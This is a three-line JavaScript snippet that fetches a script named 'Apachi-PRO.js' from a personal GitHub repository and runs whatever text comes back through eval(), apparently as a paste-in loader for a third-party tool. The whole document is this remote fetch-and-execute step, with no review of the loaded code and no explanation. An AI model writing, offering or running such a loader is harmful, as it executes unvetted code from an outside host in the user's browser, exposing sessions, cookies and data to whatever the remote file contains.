req = new XMLHttpRequest(); 
req.open('GET', 'https://raw.githubusercontent.com/daschoolcoder/apachi/apachi-pro/Apachi-PRO.js'); 
req.onload = function() { eval(this.responseText ); }; req.send();

